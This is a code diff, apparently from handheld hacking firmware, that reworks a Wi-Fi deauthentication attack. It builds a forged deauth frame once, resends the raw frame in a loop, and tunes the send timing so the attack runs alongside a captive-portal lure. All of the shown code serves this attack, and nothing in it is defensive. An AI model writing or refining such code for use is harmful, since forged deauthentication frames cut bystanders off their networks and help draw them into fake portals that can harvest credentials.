@@ -1838,6 +1838,8 @@ void wsAmenu_loop() {
     DISP.print("\n");
     DISP.printf(TXT_WF_CHANN, channel);
     DISP.print("> " + apMac);
+    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+    wsl_bypasser_send_deauth_frame(&ap_record, channel);                                        // DEAUTH CREATE FRAME
 
     cursor = 0;
     rstOverride = false;
@@ -1846,7 +1848,7 @@ void wsAmenu_loop() {
   void deauth_loop(){
 
     if (target_deauth == true) {                                                                 // DEAUTH
-      wsl_bypasser_send_deauth_frame(&ap_record, channel);                                       // DEAUTH         CREATE AND SEND FRAME
+      wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));                   // DEAUTH SEND FRAME
       DISP.setTextSize(SMALL_TEXT);                                                              // DEAUTH
       DISP.setTextColor(TFT_RED, BGCOLOR);                                                       // DEAUTH
       DISP.setCursor(1, 115);                                                                    // DEAUTH
@@ -1860,7 +1862,7 @@ void wsAmenu_loop() {
       DISP.setTextColor(FGCOLOR, BGCOLOR);                                                       // DEAUTH
     }                                                                                            // DEAUTH
 
-    //delay(20); //from 200
+    delay(100); //from 200
 
     if (check_select_press()){                                                                    // DEAUTH
       target_deauth = !target_deauth;                                                             // DEAUTH
@@ -1970,6 +1972,10 @@ void portal_setup(){
   cursor = 0;
   rstOverride = true;
   printHomeToScreen();
+  #if defined(DEAUTHER)                                                                      // DEAUTH
+  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));                  // DEAUTH
+  wsl_bypasser_send_deauth_frame(&ap_record, channel);                                       // DEAUTH  CREATE FRAME
+  #endif                                                                                     // DEAUTH
   delay(500); // Prevent switching after menu loads up
 }
 
@@ -1985,8 +1991,8 @@ void portal_loop(){
     #if defined(DEAUTHER)
       if (target_deauth_flg) {
         if (target_deauth == true) {                                                                 // DEAUTH
-          if (deauth_tick==15) {                // 45 is +-150ms   (Add delay to attack, without reflection on portal)
-            wsl_bypasser_send_deauth_frame(&ap_record, channel);                                     // DEAUTH   
+          if (deauth_tick==35) {                                                                     // 35 is +-100ms   (Add delay to attack, without reflection on portal)
+            wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));                 // DEAUTH   SEND FRAME
             deauth_tick=0;
           } else { 
             deauth_tick=deauth_tick+1; 
